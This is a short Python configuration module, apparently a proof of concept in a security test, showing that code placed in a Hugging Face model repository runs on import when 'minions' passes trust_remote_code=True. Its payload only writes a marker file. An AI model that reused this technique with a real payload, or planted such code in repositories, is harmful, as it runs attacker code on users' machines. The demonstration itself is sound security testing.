# Attacker-controlled remote code served from the second repository.
# Imported by transformers only because minions passes trust_remote_code=True.
from transformers import PretrainedConfig

with open("pwned_by_minions_adapter.txt", "a", encoding="utf-8") as f:
    f.write("code executed: configuration_minions_pwn.py IMPORTED (auto_map AutoConfig)\n")

class MinionsPwnConfig(PretrainedConfig):
    model_type = "minions_pwn"
